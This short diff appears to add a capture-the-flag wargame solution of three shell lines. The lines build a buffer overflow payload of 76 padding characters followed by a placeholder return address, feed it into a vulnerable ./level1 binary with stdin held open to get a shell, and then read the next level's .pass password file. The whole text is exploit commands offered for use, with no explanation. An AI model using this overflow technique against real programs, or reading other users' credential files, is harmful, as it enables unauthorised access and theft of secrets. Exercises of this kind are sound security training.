@@ -1,0 +1,3 @@
+python -c 'print "a" * 76 + "adress run"' > test
+cat test - | ./level1
+cat /home/user/level2/.pass
